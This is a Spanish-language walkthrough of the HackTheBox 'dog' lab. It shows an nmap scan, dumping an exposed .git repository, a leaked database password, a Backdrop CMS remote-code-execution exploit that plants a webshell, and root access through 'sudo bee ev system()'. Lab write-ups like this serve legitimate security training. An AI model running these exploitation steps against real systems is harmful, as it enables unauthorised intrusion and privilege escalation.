# Walkthrough - HTB "dog" Machine

Este walkthrough detalla el proceso completo para explotar la máquina "dog" de HackTheBox. Se describen los pasos que incluyen la verificación de que la máquina está activa, descarga del repositorio Git, obtención de credenciales para el CMS Backdrop, explotación de una vulnerabilidad RCE en Backdrop, obtención de un shell, escalada de privilegios vía SSH y sudo, y finalmente la obtención de ambas flags (user y root).

---

## 1. Comprobación de Disponibilidad y Enumeración Inicial

Primero, se hace *ping* para confirmar que la máquina está activa y verificar el sistema operativo.

```bash
ping 10.10.11.58
```
**Salida (fragmento):**

PING 10.10.11.58 (10.10.11.58) 56(84) bytes of data. 64 bytes from 10.10.11.58: icmp_seq=1 ttl=63 time=39.9 ms 64 bytes from 10.10.11.58: icmp_seq=2 ttl=63 time=51.0 ms ...

Luego se realiza un escaneo con Nmap para identificar los puertos abiertos:

```bash
nmap -p- --min-rate=1000 -vvv -Pn 10.10.11.58
```
**Salida (fragmento):**

PORT STATE SERVICE 22/tcp open ssh syn-ack 80/tcp open http syn-ack

La máquina tiene abiertos los puertos **22 (SSH)** y **80 (HTTP)**.

---

## 2. Descarga del Repositorio Git

Se detecta que el directorio **.git** está accesible. Se procede a descargar el repositorio usando *git-dumper*. Primero se crea un entorno virtual, se instala la herramienta y luego se descarga:

```bash
python3 -m venv venv
source venv/bin/activate
pip install git-dumper
git-dumper http://10.10.11.58/.git/ ./dog_git_repo
```
Durante la descarga se encuentra, en el fichero de configuración **settings**, la siguiente cadena:

mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop


Esto indica que se usa la contraseña **BackDropJ2024DS2024** para la conexión a la base de datos del CMS Backdrop. Además, se localiza el correo de Tiffany en el repositorio, lo cual permite acceder al CMS.

---

## 3. Explotación del CMS y Vulnerabilidad RCE en Backdrop

Con las credenciales obtenidas (correo y la password de la BD) se accede al CMS Backdrop. Se investigan vulnerabilidades para Backdrop y se encuentra una RCE disponible en Exploit‑DB:  
[Exploit RCE - Exploit-DB 52021](https://www.exploit-db.com/exploits/52021).

Se descarga y se ejecuta el exploit:

```bash
python3 exploit.py 10.10.11.58
```
**Salida (fragmento):**

Backdrop CMS 1.27.1 - Remote Command Execution Exploit Evil module generating... Evil module generated! shell.zip Go to 10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation. Your shell address: 10.10.11.58/modules/shell/shell.php

Al darse cuenta de que la instalación no acepta archivos ZIP, se comprime el directorio que contiene el shell con:
  
```bash
tar -cvf shell.tar shell/
```
Con el archivo preparado se sube mediante la interfaz del CMS (en la sección de módulos, instalación manual) y se accede al webshell en:

http://dog.htb/modules/shell/shell.php?cmd=ls+%2Fhome


Esto permite ejecutar comandos; se visualizan los usuarios disponibles en `/home` y se accede por SSH usando la contraseña obtenida desde la BD.

---

## 4. Obtención de la User Flag

El acceso por SSH, usando las credenciales obtenidas (BackDropJ2024DS2024) facilita el ingreso al sistema. Además, se encuentra en la home un fichero llamado **myscript.php** con el contenido:

```bash
<?php system('id'); ?>
```
Aunque este script sirve para probar la ejecución de comandos, la flag de usuario se obtiene accediendo por SSH con las credenciales del CMS y explorando el sistema.

---

## 5. Escalada de Privilegios y Obtención de la Root Flag

Se consulta la posibilidad de escalar privilegios mediante sudo:

```bash
sudo -l
```
**Salida:**

Matching Defaults entries for johncusack on dog: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User johncusack may run the following commands on dog: (ALL : ALL) /usr/local/bin/bee

El usuario **johncusack** puede ejecutar sin contraseña el comando **/usr/local/bin/bee**, una utilidad para controlar Backdrop desde línea de comandos (ver [Bee en Backdrop CMS](https://backdropcms.org/project/bee)).

El comando `bee ev` permite evaluar código PHP. Se prueba lo siguiente para ejecutar comandos:
  
```bash
sudo /usr/local/bin/bee ev "system('ls')"
```
Se verifica además el contenido de `/root/`:
  
```bash
sudo /usr/local/bin/bee ev "system('ls /root/')"
``` 
Se observa la presencia de **root.txt**. Finalmente se lee la flag:

```bash
sudo /usr/local/bin/bee ev "system('cat /root/root.txt')"
``` 

Con esto se obtiene la **root flag**.

---

## 6. Conclusiones

Este walkthrough mostró los siguientes pasos:

1. **Comprobación y Enumeración Inicial:**  
   - Se verificó la disponibilidad con `ping` y se escanearon los puertos con Nmap (22 y 80).

2. **Descarga del Repositorio Git:**  
   - Se utilizó *git-dumper* para bajar el repositorio expuesto y se encontró la cadena de conexión a la BD del CMS Backdrop, permitiendo obtener acceso al sistema.

3. **Explotación del CMS y RCE en Backdrop:**  
   - Se ejecutó un exploit RCE (Exploit‑DB 52021) para generar un webshell, se preparó el archivo (comprimiéndolo), se subió y se obtuvo acceso mediante el shell.

4. **Obtención de la User Flag:**  
   - Se accedió al sistema via SSH con las credenciales obtenidas, y se encontró la primera flag.

5. **Escalada de Privilegios para Obtener la Root Flag:**  
   - Se ejecutó el comando `sudo /usr/local/bin/bee ev` para evaluar código PHP y ejecutar comandos que permitieron listar y leer el contenido de `/root/`, obteniendo la segunda flag.

**¡Enhorabuena! Has conseguido ambas flags.**

> **Advertencia:**  
> Este ejercicio se realizó en un entorno controlado (CTF). Utiliza estos conocimientos únicamente de forma ética y legal.

---